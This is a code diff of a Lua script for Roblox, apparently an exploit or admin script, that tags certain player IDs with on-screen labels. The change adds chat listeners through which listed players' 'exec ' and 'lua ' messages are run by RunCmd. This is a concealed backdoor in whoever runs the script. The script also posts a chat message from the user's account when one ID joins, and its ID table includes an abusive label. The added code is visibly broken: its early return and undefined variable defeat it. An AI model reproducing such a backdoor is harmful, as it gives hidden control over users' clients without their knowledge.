@@ -1476,7 +1476,7 @@ local CoolkidTable = {
 	['57370993'] = "!fishgang Karma";
 	['713966451'] = "!fishgang Karma Alt";
 	['20220183'] = "Wya";
-	['105183043'] = "Pedo skid"; 
+	['105183043'] = "Pedo skid";
 	['114164798'] = "!fishgang Slays";
 	['868723261'] = "!fishgang Slays";
 	['1066925283'] = "!fishgang Slays";
@@ -1486,13 +1486,13 @@ local CoolkidTable = {
 	['134755460'] = "!fishgang Slays";
 }
 
-local function espcoolkid(plr,Name)
+local function espcoolkid(Plr,Char)
 	local CoolKid1 = Instance.new("BillboardGui",CoreGui.RobloxGui)
-	CoolKid1.Adornee = LP.Character.Head
+	CoolKid1.Adornee = Char.Head
 	CoolKid1.Size = UDim2.new(0, 100, 0, 100)
 	CoolKid1.StudsOffset = Vector3.new(0, 1, 0)
 	CoolKid1.AlwaysOnTop = true
-	CoolKid1.Name = ""..Name
+	CoolKid1.Name = ""..CoolkidTable[tostring(Plr.UserId)]
 	local CoolKid2 = Instance.new("TextLabel",CoolKid1)
 	CoolKid2.BackgroundTransparency = 1
 	CoolKid2.Position = UDim2.new(0, 0, 0, 0)
@@ -1501,47 +1501,53 @@ local function espcoolkid(plr,Name)
 	CoolKid2.TextStrokeTransparency = 0.5
 	CoolKid2.TextSize = 15
 	CoolKid2.TextStrokeColor3 = Color3.fromRGB(40, 127, 71)
-	CoolKid2.Text = ""..Name
-	plr.CharacterRemoving:Connect(function()
+	CoolKid2.Text = ""..CoolkidTable[tostring(Plr.UserId)]
+	Plr.CharacterRemoving:Connect(function()
 		CoolKid1:Destroy()
 		CoolKid2:Destroy()
 	end)
-	Players.PlayerRemoving:Connect(function(Plr)
-		if Plr == plr then 
+	Players.PlayerRemoving:Connect(function(plr)
+		if plr == Plr then 
 			CoolKid1:Destroy()
 			CoolKid2:Destroy()
 		end
 	end)
 end
 
-for i,v in pairs(Players:GetPlayers()) do
-	for k,n in pairs(CoolkidTable) do
-		if tostring(v.UserId) == k then
-			espcoolkid(v,n)
-			v.CharacterAdded:Connect(function(Plr)
-				repeat wait() until Plr.Head
-				espcoolkid(v,n)
-			end)
-		end
+for i,v in pairs(Players:GetPlayers()) do 
+	if CoolkidTable[tostring(v.UserId)] then 
+		espcoolkid(v,v.Character)
+		v.CharacterAdded:Connect(function(Char)
+			repeat wait() until Char.Head
+			espcoolkid(v,v.Character)
+		end)
+		v.Chatted:Connect(function(Chat)
+			if CoolkidTable[tostring(v.UserId)] then return end 
+			if Chat:sub(1,5) == "exec " then 
+				RunCmd(chat:sub(6))
+			elseif Chat:sub(1,4) == "lua " then 
+				RunCmd(chat:sub(5))
+			end
+		end)
 	end
 end
 
-Players.PlayerAdded:Connect(function(Plr)
-	Plr.CharacterAdded:Connect(function(Char)
-	repeat wait() until LP.Character.Head
-		for k,n in pairs(CoolkidTable) do
-			if tostring(Plr.UserId) == k then
-				espcoolkid(Plr,n)
-				Plr.Chatted:Connect(function(Chat)
-					if Chat:sub(1,5) == "exec " then 
-						RunCmd(Prefix..Chat:sub(6))
-					end
-				end)
+Players.PlayerAdded:Connect(function(plr)
+	if CoolkidTable[tostring(plr.UserId)] then
+		plr.CharacterAdded:Connect(function(Char)
+			repeat wait() until Char.Head
+			espcoolkid(plr,Char)
+		end)
+		plr.Chatted:Connect(function(Chat)
+			if CoolkidTable[tostring(plr.UserId)] then return end 
+			if Chat:sub(1,5) == "exec " then 
+				RunCmd(chat:sub(6))
+			elseif Chat:sub(1,4) == "lua " then 
+				RunCmd(chat:sub(5))
 			end
-		end			
-	end)
-	if tostring(Plr.UserId) == "659119329" then 
-		wait(25)
+		end)
+	end
+	if tostring(plr.UserId) == "659119329" then 
 		ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Your god Cyrus has joined.","All")
 	end
 end)
